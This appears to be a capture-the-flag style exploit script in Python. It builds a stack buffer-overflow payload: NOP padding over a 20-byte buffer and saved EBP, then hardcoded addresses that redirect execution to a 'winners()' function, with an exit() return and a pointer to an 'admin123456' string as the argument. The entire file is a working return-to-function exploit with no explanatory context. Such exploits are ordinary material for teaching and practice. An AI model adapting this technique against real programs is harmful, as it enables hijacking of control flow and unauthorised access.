#!/usr/bin/env python3
import sys

payload  = b"\x90" * 24           # padding (20 byte buffer + 4 byte saved EBP)
payload += b"\x75\x98\x04\x08"    # winners()
payload += b"\x60\xc6\x04\x08"    # exit()
payload += b"\x48\x30\x0e\x08"    # "admin123456"

sys.stdout.buffer.write(payload)
